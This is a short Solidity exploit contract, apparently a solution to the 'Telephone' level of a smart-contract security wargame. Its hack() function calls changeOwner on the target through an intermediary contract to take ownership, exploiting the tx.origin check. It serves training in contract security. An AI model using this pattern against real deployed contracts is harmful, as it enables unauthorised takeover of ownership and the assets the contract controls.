// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    Telephone telephone = Telephone(0x7c5e3389A8B73883968949cF17c524E34b824acb);

    function hack() external {
        telephone.changeOwner(0xf001Ab8845a8457C76eFf8194C9a936a745C3814);
    }
}